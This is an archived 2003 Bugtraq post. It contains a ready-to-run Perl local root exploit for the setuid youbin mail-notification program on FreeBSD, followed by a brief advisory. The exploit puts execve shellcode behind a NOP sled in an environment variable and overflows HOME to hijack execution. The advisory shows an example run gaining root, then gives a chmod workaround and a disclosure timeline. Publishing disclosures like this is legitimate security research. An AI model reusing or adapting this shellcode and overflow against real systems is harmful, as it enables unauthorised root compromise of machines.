=== Content from marc.info_74d2285d_20250124_161410.html ===

```
[[prev in list](?l=bugtraq&m=105223947528792&w=2)] [[next in list](?l=bugtraq&m=105223471822836&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=105224395302131&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [youbin local root exploit + advisory](?t=105223957900004&r=1&w=2)
From:       [Knud_Erik_Højgaard <address-modified-due-to-out-of-office-and](?a=105222796100001&r=1&w=2)
Date:       [2003-05-06 12:16:11](?l=bugtraq&r=1&w=2&b=200305)
[Download RAW [message](?l=bugtraq&m=105223947528794&q=mbox) or [body](?l=bugtraq&m=105223947528794&q=raw)]

Attached documents explain all.
--
kokanin at dtors.net
[["DSR-youbin.pl" (application/octet-stream)]](?l=bugtraq&m=105223947528794&q=p3)

#!/usr/bin/perl
# DSR-youbin.pl - kokaninATdtors.net vs. /usr/ports/mail/youbin
# offset, retaddr and shellcode is for my FreeBSD 4.7-RELEASE, YMMV
# shellcode by eSDee, he's cool
# youbin-3.4          Mail arrival notification service package

$len = 512;
$ret = pack("l",0xbfbffd68);
$nop = "\x90";
$shellcode = 	"\x31\xc0\x50\x50\xb0\x17\xcd\x80\x31\xc0\x50\x68".
		"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50".
		"\x54\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

for ($i = 0; $i < $len - length($shellcode); $i++) {
    $buffer .= $nop;
}
$buffer .= $shellcode;
local($ENV{'EGG'}) = $buffer;
local($ENV{'HOME'}) = $ret x 259;
system("youbin");
[["DSR-youbin.txt" (text/plain)]](?l=bugtraq&m=105223947528794&q=p4)

I. BACKGROUND

$ more /usr/ports/mail/youbin/pkg-descr
---- From README (slightly modified) ---

youbin is a kind of biff in the network age. When youbin is used, the
mail spool of a certain, specific machine (mail server) is observed to
inform the arrival of mail to a user at an arbitrary machine through
the network.  On the other hands, the conventional "biff" informs only
the user who logs in at the machine on which the mail spool
resides. Combining with POP, youbin eliminates a lot of NFS mount of
mail spool directory caused by checking mail arrival.

More information is available at:
<http://www.agusa.nuie.nagoya-u.ac.jp/software/agusalab/youbin/youbin-e.html>

II. DESCRIPTION

Insufficient bounds checking leads to execution of arbitrary code.
perl exploit follows this document.

III. ANALYSIS

Upon setting a large value for the HOME environment variable a buffer can be
overflowed. Since youbin is setuid root this effectively allows for a full
system compromise.

Example run:
$ id
uid=1000(kokanin) gid=1000(kokanin) groups=1000(kokanin), 0(wheel)
$ perl DSR-youbin.pl
# id
uid=0(root) gid=1000(kokanin) groups=1000(kokanin), 0(wheel)

IV. DETECTION

youbin-3.4 shipping with freebsd ports per 02/03/03, the latest available
at the time of writing, is known to be vulnerable.

V. WORKAROUND

# chmod -s `which youbin`

VI. VENDOR FIX

unknown

VII. CVE INFORMATION

unknown

VIII. DISCLOSURE TIMELINE

5/5/03 - FreeBSD port maintainer notified
5/5/03 - FreeBSD port maintainer replies, bug is known, apparently no fix
is planned at the moment
6/5/03 - public disclosure

IX. CREDIT

Knud Erik Højgaard/kokanin, dtors security research

[[prev in list](?l=bugtraq&m=105223947528792&w=2)] [[next in list](?l=bugtraq&m=105223471822836&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=105224395302131&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


